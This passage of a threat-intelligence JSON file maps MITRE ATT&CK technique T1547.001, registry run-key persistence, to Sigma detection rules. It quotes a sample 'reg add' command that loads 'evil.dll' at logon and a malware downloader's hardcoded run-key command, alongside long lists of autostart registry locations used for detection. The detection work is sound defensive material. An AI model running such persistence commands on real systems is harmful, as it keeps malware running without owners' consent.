<code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n\\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \"C:\\\\temp\\\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\\n\\nThe following Registry keys can be used to set startup folder items for persistence:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n\\nThe following Registry keys can control automatic startup of services during boot:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n\\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n\\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell</code> subkeys can automatically launch programs.\\n\\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> run when any user logs on.\\n\\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\\n\\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.', 'modified': '2022-06-16T13:06:00.638Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Registry Run Keys / Startup Folder', 'x_mitre_detection': \"Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\\n\\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Windows Registry: Windows Registry Key Modification', 'Command: Command Execution', 'File: File Modification', 'Process: Process Creation', 'Windows Registry: Windows Registry Key Creation'], 'x_mitre_permissions_required': ['Administrator', 'User'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                        "lookup_data": {
+                            "description": "Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy",
+                            "raw": "author: Janantha Marasinghe\ndate: 2022/11/18\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting\n  or modifying the security policy\ndetection:\n  condition: selection_img and (1 of selection_flags_*)\n  selection_flags_configure:\n    CommandLine|contains|all:\n    - /configure\n    - /db\n  selection_flags_discovery:\n    CommandLine|contains|all:\n    - /export\n    - /cfg\n  selection_img:\n  - Image|endswith: \\secedit.exe\n  - OriginalFileName: SeCEdit\nfalsepositives:\n- Legitimate administrative use\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nstatus: experimental\ntags:\n- attack.discovery\n- attack.persistence\n- attack.defense_evasion\n- attack.credential_access\n- attack.privilege_escalation\n- attack.t1562.002\n- attack.t1547.001\n- attack.t1505.005\n- attack.t1556.002\n- attack.t1562\n- attack.t1574.007\n- attack.t1564.002\n- attack.t1546.008\n- attack.t1546.007\n- attack.t1547.014\n- attack.t1547.010\n- attack.t1547.002\n- attack.t1557\n- attack.t1082\ntitle: Potential Suspicious Activity Using SeCEdit\n",
+                            "sigma:id": "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                            "title": "Potential Suspicious Activity Using SeCEdit",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "170901d1-de11-4de7-bccb-8fa13678d857",
+                        "lookup_data": {
+                            "description": "Detects Silence downloader. These commands are hardcoded into the binary.",
+                            "raw": "author: Alina Stepchenkova, Roman Rezvukhin, Group-IB, oscd.community\ndate: 2019/11/01\ndescription: Detects Silence downloader. These commands are hardcoded into the binary.\ndetection:\n  condition: selection_recon | near selection_persistence\n  selection_persistence:\n    CommandLine|contains: /C REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n      /v \"WinNetworkSecurity\" /t REG_SZ /d\n  selection_recon:\n    CommandLine|contains: '>>'\n    CommandLine|endswith: temps.dat\n    Image|endswith:\n    - \\tasklist.exe\n    - \\qwinsta.exe\n    - \\ipconfig.exe\n    - \\hostname.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- Image\n- CommandLine\nid: 170901d1-de11-4de7-bccb-8fa13678d857\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\n- attack.discovery\n- attack.t1057\n- attack.t1082\n- attack.t1016\n- attack.t1033\n- attack.g0091\ntitle: Silence.Downloader V3\n",
+                            "sigma:id": "170901d1-de11-4de7-bccb-8fa13678d857",
+                            "title": "Silence.Downloader V3",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f59c3faf-50f3-464b-9f4c-1b67ab512d99",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split), wagga (name)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: main_selection and not 1 of filter_*\n  filter_IE:\n    TargetObject|contains: \\Software\\Microsoft\\Active Setup\\Installed Components\\{89820200-ECBD-11cf-8B85-00AA005B4383}\\\n  filter_chrome:\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{8A69D345-D564-463c-AFF1-A69D9E530F96}\\\n  filter_edge:\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{9459C573-B17A-45AE-9F64-1857B5D58CEE}\\\n  filter_empty:\n    Details: (Empty)\n  filter_image:\n    Image:\n    - C:\\Windows\\System32\\poqexec.exe\n    - C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\n  filter_msoffice:\n  - TargetObject|contains:\n    - \\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Classes\\PROTOCOLS\\Handler\\\n    - \\ClickToRunStore\\HKMU\\SOFTWARE\\Classes\\PROTOCOLS\\Handler\\\n  - Details:\n    - '{314111c7-a502-11d2-bbca-00c04f8ec294}'\n    - '{3459B272-CC19-4448-86C9-DDC3B4B2FAD3}'\n    - '{42089D2D-912D-4018-9087-2B87803E93FB}'\n    - '{5504BE45-A83B-4808-900A-3A5C36E7F77A}'\n    - '{807583E5-5146-11D5-A672-00B0D022E945}'\n  filter_office:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  main_selection:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows CE Services\\AutoStart\n    - \\Software\\Wow6432Node\\Microsoft\\Command Processor\\Autorun\n    - \\SOFTWARE\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\n    - \\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnDisconnect\n    - \\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnConnect\n    - \\SYSTEM\\Setup\\CmdLine\n    - \\Software\\Microsoft\\Ctf\\LangBarAddin\n    - \\Software\\Microsoft\\Command Processor\\Autorun\n    - \\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\n    - \\SOFTWARE\\Classes\\Protocols\\Handler\n    - \\SOFTWARE\\Classes\\Protocols\\Filter\n    - \\SOFTWARE\\Classes\\Htmlfile\\Shell\\Open\\Command\\(Default)\n    - \\Environment\\UserInitMprLogonScript\n    - \\SOFTWARE\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\\Scrnsave.exe\n    - \\Software\\Microsoft\\Internet Explorer\\UrlSearchHooks\n    - \\SOFTWARE\\Microsoft\\Internet Explorer\\Desktop\\Components\n    - \\Software\\Classes\\Clsid\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\Inprocserver32\n    - \\Control Panel\\Desktop\\Scrnsave.exe\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: f59c3faf-50f3-464b-9f4c-1b67ab512d99\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/04/04\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\n- https://persistence-info.github.io/Data/userinitmprlogonscript.html\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Common Autorun Keys Modification\n",
+                            "sigma:id": "f59c3faf-50f3-464b-9f4c-1b67ab512d99",
+                            "title": "Common Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b7916c2a-fa2f-4795-9477-32b731f70f11",
+                        "lookup_data": {
+                            "description": "Detects a possible persistence mechanism using RUN key for Windows Explorer and pointing to a suspicious folder",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community\ndate: 2018/07/18\ndescription: Detects a possible persistence mechanism using RUN key for Windows Explorer\n  and pointing to a suspicious folder\ndetection:\n  condition: selection and selection2\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: \\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n  selection2:\n  - Details|startswith:\n    - C:\\Windows\\Temp\\\n    - C:\\ProgramData\\\n    - C:\\$Recycle.bin\\\n    - C:\\Temp\\\n    - C:\\Users\\Public\\\n    - C:\\Users\\Default\\\n  - Details|contains: \\AppData\\\nfalsepositives:\n- Unknown\nfields:\n- Image\n- ParentImage\nid: b7916c2a-fa2f-4795-9477-32b731f70f11\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Registry Persistence via Explorer Run Key\n",
+                            "sigma:id": "b7916c2a-fa2f-4795-9477-32b731f70f11",
+                            "title": "Registry Persistence via Explorer Run Key",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                        "lookup_data": {
+                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1663580963",
+                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "de587dce-915e-4218-aac4-835ca6af6f70",
+                        "lookup_data": {
+                            "description": "Detects suspicious command line reg.exe tool adding key to RUN key in Registry",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/06/28\ndescription: Detects suspicious command line reg.exe tool adding key to RUN key in\n  Registry\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - reg\n    - ' ADD '\n    - Software\\Microsoft\\Windows\\CurrentVersion\\Run\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reasons.\n- Legitimate administrator sets up autorun keys for legitimate reasons.\n- Discord\nid: de587dce-915e-4218-aac4-835ca6af6f70\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/\n- https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Potential Persistence Attempt Via Run Keys Using Reg.EXE\n",
+                            "sigma:id": "de587dce-915e-4218-aac4-835ca6af6f70",
+                            "title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "17f878b8-9968-4578-b814-c4217fc5768c",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  classes:\n    TargetObject|contains:\n    - \\Folder\\ShellEx\\ExtShellFolderViews\n    - \\Folder\\ShellEx\\DragDropHandlers\n    - \\Folder\\Shellex\\ColumnHandlers\n    - \\Filter\n    - \\Exefile\\Shell\\Open\\Command\\(Default)\n    - \\Directory\\Shellex\\DragDropHandlers\n    - \\Directory\\Shellex\\CopyHookHandlers\n    - \\CLSID\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\Instance\n    - \\CLSID\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\Instance\n    - \\CLSID\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\Instance\n    - \\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\Instance\n    - \\Classes\\AllFileSystemObjects\\ShellEx\\DragDropHandlers\n    - \\.exe\n    - \\.cmd\n    - \\ShellEx\\PropertySheetHandlers\n    - \\ShellEx\\ContextMenuHandlers\n  classes_base:\n    TargetObject|contains: \\Software\\Classes\n  condition: main_selection OR session_manager_base AND session_manager OR current_version_base\n    AND current_version OR nt_current_version_base AND nt_current_version OR wow_current_version_base\n    AND wow_current_version OR wow_nt_current_version_base AND wow_nt_current_version\n    OR (wow_office OR office) AND wow_office_details OR (wow_ie OR ie) AND wow_ie_details\n    OR wow_classes_base AND wow_classes OR classes_base AND classes OR scripts_base\n    AND scripts OR winsock_parameters_base AND winsock_parameters OR system_control_base\n    AND system_control\n  current_version:\n    TargetObject|contains:\n    - \\ShellServiceObjectDelayLoad\n    - \\Run\n    - \\Policies\\System\\Shell\n    - \\Policies\\Explorer\\Run\n    - \\Group Policy\\Scripts\\Startup\n    - \\Group Policy\\Scripts\\Shutdown\n    - \\Group Policy\\Scripts\\Logon\n    - \\Group Policy\\Scripts\\Logoff\n    - \\Explorer\\ShellServiceObjects\n    - \\Explorer\\ShellIconOverlayIdentifiers\n    - \\Explorer\\ShellExecuteHooks\n    - \\Explorer\\SharedTaskScheduler\n    - \\Explorer\\Browser Helper Objects\n    - \\Authentication\\PLAP Providers\n    - \\Authentication\\Credential Providers\n    - \\Authentication\\Credential Provider Filters\n  current_version_base:\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n  ie:\n    TargetObject|contains: \\Software\\Microsoft\\Internet Explorer\n  main_selection:\n    TargetObject|contains:\n    - \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows CE Services\\AutoStart\n    - \\Software\\Wow6432Node\\Microsoft\\Command Processor\\Autorun\n    - \\SOFTWARE\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\n    - \\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnDisconnect\n    - \\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnConnect\n    - \\SYSTEM\\Setup\\CmdLine\n    - \\Software\\Microsoft\\Ctf\\LangBarAddin\n    - \\Software\\Microsoft\\Command Processor\\Autorun\n    - \\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\n    - \\SOFTWARE\\Classes\\Protocols\\Handler\n    - \\SOFTWARE\\Classes\\Protocols\\Filter\n    - \\SOFTWARE\\Classes\\Htmlfile\\Shell\\Open\\Command\\(Default)\n    - \\Environment\\UserInitMprLogonScript\n    - \\SOFTWARE\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\\Scrnsave.exe\n    - \\Software\\Microsoft\\Internet Explorer\\UrlSearchHooks\n    - \\SOFTWARE\\Microsoft\\Internet Explorer\\Desktop\\Components\n    - \\Software\\Classes\\Clsid\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\Inprocserver32\n    - \\Control Panel\\Desktop\\Scrnsave.exe\n  nt_current_version:\n    TargetObject|contains:\n    - \\Winlogon\\VmApplet\n    - \\Winlogon\\Userinit\n    - \\Winlogon\\Taskman\n    - \\Winlogon\\Shell\n    - \\Winlogon\\GpExtensions\n    - \\Winlogon\\AppSetup\n    - \\Winlogon\\AlternateShells\\AvailableShells\n    - \\Windows\\IconServiceLib\n    - \\Windows\\Appinit_Dlls\n    - \\Image File Execution Options\n    - \\Font Drivers\n    - \\Drivers32\n    - \\Windows\\Run\n    - \\Windows\\Load\n  nt_current_version_base:\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\n  office:\n    TargetObject|contains: \\Software\\Microsoft\\Office\n  scripts:\n    TargetObject|contains:\n    - \\Startup\n    - \\Shutdown\n    - \\Logon\n    - \\Logoff\n  scripts_base:\n    TargetObject|contains: \\Software\\Policies\\Microsoft\\Windows\\System\\Scripts\n  session_manager:\n    TargetObject|contains:\n    - \\SetupExecute\n    - \\S0InitialCommand\n    - \\KnownDlls\n    - \\Execute\n    - \\BootExecute\n    - \\AppCertDlls\n  session_manager_base:\n    TargetObject|contains: \\System\\CurrentControlSet\\Control\\Session Manager\n  system_control:\n    TargetObject|contains:\n    - \\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram\n    - \\Terminal Server\\Wds\\rdpwd\\StartupPrograms\n    - \\SecurityProviders\\SecurityProviders\n    - \\SafeBoot\\AlternateShell\n    - \\Print\\Providers\n    - \\Print\\Monitors\n    - \\NetworkProvider\\Order\n    - \\Lsa\\Notification Packages\n    - \\Lsa\\Authentication Packages\n    - \\BootVerificationProgram\\ImagePath\n  system_control_base:\n    TargetObject|contains: \\SYSTEM\\CurrentControlSet\\Control\n  winsock_parameters:\n    TargetObject|contains:\n    - \\Protocol_Catalog9\\Catalog_Entries\n    - \\NameSpace_Catalog5\\Catalog_Entries\n  winsock_parameters_base:\n    TargetObject|contains: \\System\\CurrentControlSet\\Services\\WinSock2\\Parameters\n  wow_classes:\n    TargetObject|contains:\n    - \\Folder\\ShellEx\\ExtShellFolderViews\n    - \\Folder\\ShellEx\\DragDropHandlers\n    - \\Folder\\ShellEx\\ColumnHandlers\n    - \\Directory\\Shellex\\DragDropHandlers\n    - \\Directory\\Shellex\\CopyHookHandlers\n    - \\CLSID\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\Instance\n    - \\CLSID\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\Instance\n    - \\CLSID\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\Instance\n    - \\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\Instance\n    - \\AllFileSystemObjects\\ShellEx\\DragDropHandlers\n    - \\ShellEx\\PropertySheetHandlers\n    - \\ShellEx\\ContextMenuHandlers\n  wow_classes_base:\n    TargetObject|contains: \\Software\\Wow6432Node\\Classes\n  wow_current_version:\n    TargetObject|contains:\n    - \\ShellServiceObjectDelayLoad\n    - \\Run\n    - \\Explorer\\ShellServiceObjects\n    - \\Explorer\\ShellIconOverlayIdentifiers\n    - \\Explorer\\ShellExecuteHooks\n    - \\Explorer\\SharedTaskScheduler\n    - \\Explorer\\Browser Helper Objects\n  wow_current_version_base:\n    TargetObject|contains: \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\n  wow_ie:\n    TargetObject|contains: \\Software\\Wow6432Node\\Microsoft\\Internet Explorer\n  wow_ie_details:\n    TargetObject|contains:\n    - \\Toolbar\n    - \\Extensions\n    - \\Explorer Bars\n  wow_nt_current_version:\n    TargetObject|contains:\n    - \\Windows\\Appinit_Dlls\n    - \\Image File Execution Options\n    - \\Drivers32\n  wow_nt_current_version_base:\n    TargetObject|contains: \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\n  wow_office:\n    TargetObject|contains: \\Software\\Wow6432Node\\Microsoft\\Office\n  wow_office_details:\n    TargetObject|contains:\n    - \\Word\\Addins\n    - \\PowerPoint\\Addins\n    - \\Outlook\\Addins\n    - \\Onenote\\Addins\n    - \\Excel\\Addins\n    - \\Access\\Addins\n    - test\\Special\\Perf\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: 17f878b8-9968-4578-b814-c4217fc5768c\nlevel: medium\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2020/11/04\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\n- attack.t1060\ntitle: Autorun Keys Modification\n",
+                            "sigma:id": "17f878b8-9968-4578-b814-c4217fc5768c",
+                            "title": "Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "24357373-078f-44ed-9ac4-6d334a668a11",
+                        "lookup_data": {
+                            "description": "Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/25\ndescription: Detects direct modification of autostart extensibility point (ASEP) in\n  registry using reg.exe.\ndetection:\n  condition: all of selection_*\n  selection_1:\n    CommandLine|contains: add\n    Image|endswith: \\reg.exe\n  selection_2:\n    CommandLine|contains:\n    - \\software\\Microsoft\\Windows\\CurrentVersion\\Run\n    - \\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\n    - \\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\n    - \\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n    - \\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n    - \\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reasons.\n- Legitimate administrator sets up autorun keys for legitimate reasons.\n- Discord\nfields:\n- CommandLine\n- ParentCommandLine\nid: 24357373-078f-44ed-9ac4-6d334a668a11\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/04\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Direct Autorun Keys Modification\n",
+                            "sigma:id": "24357373-078f-44ed-9ac4-6d334a668a11",
+                            "title": "Direct Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: all of current_version_* and not 1 of filter_*\n  current_version_base:\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n  current_version_keys:\n    TargetObject|contains:\n    - \\ShellServiceObjectDelayLoad\n    - \\Run\\\n    - \\RunOnce\\\n    - \\RunOnceEx\\\n    - \\RunServices\\\n    - \\RunServicesOnce\\\n    - \\Policies\\System\\Shell\n    - \\Policies\\Explorer\\Run\n    - \\Group Policy\\Scripts\\Startup\n    - \\Group Policy\\Scripts\\Shutdown\n    - \\Group Policy\\Scripts\\Logon\n    - \\Group Policy\\Scripts\\Logoff\n    - \\Explorer\\ShellServiceObjects\n    - \\Explorer\\ShellIconOverlayIdentifiers\n    - \\Explorer\\ShellExecuteHooks\n    - \\Explorer\\SharedTaskScheduler\n    - \\Explorer\\Browser Helper Objects\n    - \\Authentication\\PLAP Providers\n    - \\Authentication\\Credential Providers\n    - \\Authentication\\Credential Provider Filters\n  filter_AVG:\n    Details:\n    - '\"C:\\Program Files\\AVG\\Antivirus\\AvLaunch.exe\" /gui'\n    - '\"C:\\Program Files (x86)\\AVG\\Antivirus\\AvLaunch.exe\" /gui'\n    - '{472083B0-C522-11CF-8763-00608CC02F24}'\n    Image|startswith: C:\\Program Files\\AVG\\Antivirus\\Setup\\\n  filter_all:\n  - Details: (Empty)\n  - TargetObject|endswith: \\NgcFirst\\ConsecutiveSwitchCount\n  - Image|endswith:\n    - \\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe\n    - \\AppData\\Roaming\\Spotify\\Spotify.exe\n    - \\AppData\\Local\\WebEx\\WebexHost.exe\n  - Image:\n    - C:\\WINDOWS\\system32\\devicecensus.exe\n    - C:\\Windows\\system32\\winsat.exe\n    - C:\\Program Files\\Microsoft OneDrive\\StandaloneUpdater\\OneDriveSetup.exe\n    - C:\\Program Files\\Microsoft OneDrive\\Update\\OneDriveSetup.exe\n    - C:\\Program Files (x86)\\Microsoft OneDrive\\Update\\OneDriveSetup.exe\n    - C:\\Program Files\\KeePass Password Safe 2\\ShInstUtil.exe\n    - C:\\Program Files\\Everything\\Everything.exe\n    - C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\n  filter_aurora_dashboard:\n    Details: C:\\Program Files\\Aurora-Agent\\tools\\aurora-dashboard.exe\n    Image|endswith:\n    - \\aurora-agent-64.exe\n    - \\aurora-agent.exe\n    TargetObject|endswith: 